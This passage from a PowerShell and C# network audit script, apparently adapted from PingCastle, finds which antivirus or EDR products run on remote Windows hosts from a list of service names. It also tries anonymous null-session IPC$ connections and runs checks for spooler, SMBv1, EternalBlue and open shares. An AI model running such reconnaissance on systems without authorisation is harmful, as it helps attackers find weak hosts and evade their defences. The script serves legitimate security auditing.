			{"Smcinst", "Symantec Connect"},
			{"SmcService", "Symantec Connect"},
			 
			{"AMSP", "Trend"},
			{"tmcomm", "Trend"},
			{"tmactmon", "Trend"},
			{"tmevtmgr", "Trend"},
			{"ntrtscan", "Trend Micro Worry Free Business"},

			{"WRSVC", "Webroot"},

			{"WinDefend", "Windows Defender Antivirus Service"},
			{"Sense ", "Windows Defender Advanced Threat Protection Service"},
			{"WdNisSvc ", "Windows Defender Antivirus Network Inspection Service"},

			
		};


        public static void RunTestAV(string computer)
		{
			foreach (var entry in AVReference)
			{
				if (ConvertNameToSID("NT Service\\" + entry.Key, computer) != null)
				{
					Console.WriteLine("found: " + entry.Value + "(" + entry.Key + ")");
				}
			}
        }
    }

}
"@
        Add-Type -TypeDefinition $Source
        $list = New-Object System.Collections.ArrayList
        $ComputerNames | foreach {
            Write-Host "$_ " -NoNewline 
            [PingCastle.TestAV]::RunTestAV($_)
        }
    }
    function local:Get-NullSession {
        Param(
            [parameter(Mandatory=$true,ValueFromPipeline=$true)]
            $ComputerNames
        )
        $list = New-Object System.Collections.ArrayList
        $ComputerNames | foreach {
            try{
                New-SmbMapping -RemotePath \\$_\ipc$ -UserName '' -Password '' -ErrorAction stop
                $data = New-Object  PSObject -Property @{
                    "ComputerName" = $_
                    "Status"       = $true
                }
                $list.add($data) | Out-Null
            }
            catch{}
        }
        return $list
    }
    Write-Output "`n[*] Spool Status"
    Get-SpoolStatus -ComputerNames $ComputerNames
    Write-Output "`n[*] SMBv1 Status"
    Get-SMBv1Status -ComputerNames $ComputerNames
    Write-Output "`n[*] EternalBlue"
    Get-EternalBlueStatus -ComputerNames $ComputerNames
    Write-Output "`n[*] Antivirus"
    Get-AntiVirusStatus -ComputerNames $ComputerNames
    Write-Output "`n[*] NullSession"
    Get-NullSession -ComputerNames $ComputerNames
    Write-Output "`n[*] Open SMB shares"
    Find-DomainShare
}